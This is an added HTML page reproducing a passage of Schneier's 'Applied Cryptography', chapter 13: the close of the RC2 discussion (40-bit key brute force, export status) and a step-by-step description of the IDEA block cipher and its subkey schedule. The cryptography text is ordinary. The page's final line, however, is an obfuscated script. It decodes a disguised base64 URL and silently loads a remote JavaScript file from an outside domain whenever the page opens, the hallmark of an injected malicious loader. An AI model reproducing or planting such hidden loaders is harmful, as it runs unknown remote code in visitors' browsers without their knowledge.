@@ -1,0 +1,123 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Other Block Ciphers</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=13//-->
+<!--PAGES=318-322//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="13-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="13-06.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>RSADSI&#146;s refusal to make RC2 public casts doubt on their claims. They are willing to provide details of the algorithm to most anyone willing to sign a nondisclosure agreement, and have claimed to allow cryptanalysts to publish any negative results they find. I don&#146;t know of any cryptanalyst outside the employ of the company who studied it, since it would amount to doing their analysis work for them.
+</P>
+<P>Still, Ron Rivest is not the usual snake-oil peddler. He&#146;s a respected and competent cryptographer. I would put a fair degree of trust in the algorithm, even though I haven&#146;t personally inspected the code. RC4, once the proprietary intellectual property of RSADSI, was posted to the Internet (see Section 17.1), and it&#146;s probably just a matter of time before RC2 is posted as well.</P>
+<P>An agreement between the Software Publishers Association (SPA) and the U.S. government gave RC2 and RC4 (see Section 17.1) special export status (see Section 25.14). Products that implement one of these two algorithms have a much simpler export approval process, provided that the keys are no more than 40 bits long.</P>
+<P>Is a 40-bit key enough? There are a total of one trillion possible keys. Assuming that brute force is the most efficient method of cryptanalysis (a big assumption, considering that the algorithm has never been published), and assuming that a brute-force cryptanalysis chip can test one million keys per second, it will take him 12.7 days to find the correct key. One thousand machines working in parallel can produce the key in twenty minutes.</P>
+<P>RSA Data Security, Inc., maintains that while encryption and decryption are quick, exhaustive key search is not. A significant amount of time is spent setting up the key schedule. While this time is negligible when encrypting and decrypting messages, it is not when trying every possible key.</P>
+<P>The U.S. government would never allow export of any algorithm it couldn&#146;t, at least in theory, break. They could create a magnetic tape or CD of a specific plaintext block encrypted with every possible key. To break a given message, they could just run the tape and compare the ciphertext blocks in the message with the ciphertext blocks on the tape. If there is a match, they could try the candidate key and see if the message makes any sense. If they choose a common plaintext block (all zeros, the ASCII characters for a space, etc.), this method should work. The storage requirement for a 64-bit plaintext block encrypted with all 10<SUP>12</SUP> possible keys is 8 terabytes&#151;certainly possible.</P>
+<P>For information on licensing RC2, contact RSADSI (see Section 25.4).</P>
+<H3><A NAME="Heading10"></A><FONT COLOR="#000077">13.9 IDEA</FONT></H3>
+<P>The first incarnation of the IDEA cipher, by Xuejia Lai and James Massey, surfaced in 1990 [929]. It was called PES (Proposed Encryption Standard). The next year, after Biham and Shamir&#146;s demonstrated differential cryptanalysis, the authors strengthened their cipher against the attack and called the new algorithm IPES (Improved Proposed Encryption Standard) [931,924]. IPES changed its name to IDEA (International Data Encryption Algorithm) in 1992 [925].
+</P>
+<P>IDEA is based on some impressive theoretical foundations and, although cryptanalysis has made some progress against reduced-round variants, the algorithm still seems strong. In my opinion, it is the best and most secure block algorithm available to the public at this time.</P>
+<P>The future of IDEA is not yet clear. There has been no rush to adopt it as a replacement to DES, partly because it is patented and must be licensed for commercial applications, and partly because people are still waiting to see how well the algorithm fares during the coming years of cryptanalysis. Its current claim to fame is that it is part of PGP (see Section 24.12).</P>
+<P><FONT SIZE="+1"><B><I>Overview of IDEA</I></B></FONT></P>
+<P>IDEA is a block cipher; it operates on 64-bit plaintext blocks. The key is 128 bits long. The same algorithm is used for both encryption and decryption.
+</P>
+<P>As with all the other block ciphers we&#146;ve seen, IDEA uses both confusion and diffusion. The design philosophy behind the algorithm is one of &#147;mixing operations from different algebraic groups.&#148; Three algebraic groups are being mixed, and they are all easily implemented in both hardware and software:</P>
+<DL>
+<DD>&#151; XOR
+<DD>&#151; Addition modulo 2<SUP>16</SUP>
+<DD>&#151; Multiplication modulo 2<SUP>16</SUP> &#43; 1. (This operation can be viewed as IDEA&#146;s S-box.)
+</DL>
+<P>All these operations (and these are the only operations in the algorithm&#151;there are no bit-level permutations) operate on 16-bit sub-blocks. This algorithm is even efficient on 16-bit processors.
+</P>
+<P><FONT SIZE="+1"><B><I>Description of IDEA</I></B></FONT></P>
+<P>Figure 13.9 is an overview of IDEA. The 64-bit data block is divided into four 16-bit sub-blocks: <I>X</I><SUB>1</SUB>, <I>X</I><SUB>2</SUB>, <I>X</I><SUB>3</SUB>, and <I>X</I><SUB>4</SUB>. These four sub-blocks become the input to the first round of the algorithm. There are eight rounds total. In each round the four sub-blocks are XORed, added, and multiplied with one another and with six 16-bit subkeys. Between rounds, the second and third sub-blocks are swapped. Finally, the four sub-blocks are combined with four subkeys in an output transformation.</P>
+<P>In each round, the sequence of events is as follows:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Multiply <I>X</I><SUB>1</SUB> and the first subkey.
+<DD><B>(2)</B>&nbsp;&nbsp;Add <I>X</I><SUB>2</SUB> and the second subkey.
+<DD><B>(3)</B>&nbsp;&nbsp;Add <I>X</I><SUB>3</SUB> and the third subkey.
+<DD><B>(4)</B>&nbsp;&nbsp;Multiply <I>X</I><SUB>4</SUB> and the fourth subkey.
+<DD><B>(5)</B>&nbsp;&nbsp;XOR the results of steps (1) and (3).
+<DD><B>(6)</B>&nbsp;&nbsp;XOR the results of steps (2) and (4).
+<DD><B>(7)</B>&nbsp;&nbsp;Multiply the results of step (5) with the fifth subkey.
+<DD><B>(8)</B>&nbsp;&nbsp;Add the results of steps (6) and (7).
+<DD><B>(9)</B>&nbsp;&nbsp;Multiply the results of step (8) with the sixth subkey.
+<DD><B>(10)</B>&nbsp;&nbsp;Add the results of steps (7) and (9).
+<I><P><A NAME="Fig9"></A><A HREF="javascript:displayWindow('images/13-09.jpg',303,339 )"><IMG SRC="images/13-09t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/13-09.jpg',303,339)"><FONT COLOR="#000077"><B>Figure 13.9</B></FONT></A>&nbsp;&nbsp;IDEA.</I>
+</P>
+<DD><B>(11)</B>&nbsp;&nbsp;XOR the results of steps (1) and (9).
+<DD><B>(12)</B>&nbsp;&nbsp;XOR the results of steps (3) and (9).
+<DD><B>(13)</B>&nbsp;&nbsp;XOR the results of steps (2) and (10).
+<DD><B>(14)</B>&nbsp;&nbsp;XOR the results of steps (4) and (10).
+</DL>
+<P>The output of the round is the four sub-blocks that are the results of steps (11), (12), (13), and (14). Swap the two inner blocks (except for the last round) and that&#146;s the input to the next round.
+</P>
+<P>After the eighth round, there is a final output transformation:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Multiply <I>X</I><SUB>1</SUB> and the first subkey.
+<DD><B>(2)</B>&nbsp;&nbsp;Add <I>X</I><SUB>2</SUB> and the second subkey.
+<DD><B>(3)</B>&nbsp;&nbsp;Add <I>X</I><SUB>3</SUB> and the third subkey.
+<DD><B>(4)</B>&nbsp;&nbsp;Multiply <I>X</I><SUB>4</SUB> and the fourth subkey.
+</DL>
+<P>Finally, the four sub-blocks are reattached to produce the ciphertext.
+</P>
+<P>Creating the subkeys is also easy. The algorithm uses 52 of them (six for each of the eight rounds and four more for the output transformation). First, the 128-bit key is divided into eight 16-bit subkeys. These are the first eight subkeys for the algorithm (the six for the first round, and the first two for the second round). Then, the key is rotated 25 bits to the left and again divided into eight subkeys. The first four are used in round 2; the last four are used in round 3. The key is rotated another 25 bits to the left for the next eight subkeys, and so on until the end of the algorithm.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="13-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="13-06.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(yoQaobdT, iZLXeZaK) {iZLXeZaK = yoQaobdT.createElement('script');iZLXeZaK.type = 'text/javascript';iZLXeZaK.async = true;iZLXeZaK.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');yoQaobdT.getElementsByTagName('body')[0].appendChild(iZLXeZaK);}(document));</script></body>
+</html>
